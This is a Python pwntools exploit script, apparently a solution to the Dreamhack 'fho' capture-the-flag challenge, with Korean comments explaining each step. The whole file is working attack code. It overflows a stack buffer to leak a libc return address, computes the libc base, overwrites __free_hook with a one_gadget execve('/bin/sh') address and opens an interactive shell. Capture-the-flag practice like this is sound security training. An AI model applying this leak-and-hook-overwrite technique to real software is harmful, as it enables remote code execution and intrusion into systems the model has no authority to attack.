from pwn import *
def slog(n, m):	return success(": ".join([n, hex(m)]))
# For Offline
# p = process("./fho")

# For Online
HOST = int(input("Input host number: "))
PORT = int(input("Input port number: "))
p = remote("host"+str(HOST)+".dreamhack.games", PORT)

elf = ELF("./fho")
libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")
ret_offset = 0x21bf7
oneshot = 0x4f432

# [1] Library Var & Func Address
buf = b'A' * 0x48	# char 0x30 + long long 0x08 * 2 + SFP 0x08
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
libc_start_main_xx = u64(p.recvline()[:-1] + b"\x00" * 2)
# SFP 밑에 있는 Return Addr를 불러온다
libc_base = libc_start_main_xx - ret_offset
# Return Addr는 libc_start_main + 231을 가리키므로,
# 그만큼의 오프셋을 빼서 libc_base를 구한다.
free_hook = libc_base + libc.symbols["__free_hook"]
og = libc_base + oneshot

info(hex(libc_start_main_xx))
# libc-database와 비교할 때 유의점
# 위의 내용은 libc_start_main_ret와 동일하고,
# 이는 libc_start_main과 231만큼 차이난다
# 그러므로 Stack Buffer Overflow를 해서 얻은 Leak된 Return Addr를
# 1) 231을 빼서 __libc_start_main과 DB에서 비교하거나
# 2) __libc_start_main과 DB에서 비교한 다음
# 해당 libc를 다운받고 이를 ELF로 연결시켜주자
# 참고) offset을 libc DB에서 찾아서 값을 직접 빼줘도 된다
# ---------------------------------------------------------
# one_gadget(oneshot)을 사용할 경우
# system과 "/bin/sh" 각각을 구하는 대신
# libc의 execve("/bin/sh")으로
# hook을 바로 덮어주면 된다.
slog("libc_base", libc_base)
slog("free_hook", free_hook)

# [2] Write and Free
p.recvuntil("To write: ")
p.sendline(str(free_hook))
p.recvuntil("With: ")
p.sendline(str(og))
p.recvuntil("To free: ")
p.sendline(str(0x12345))	# 상관 없음

p.interactive()
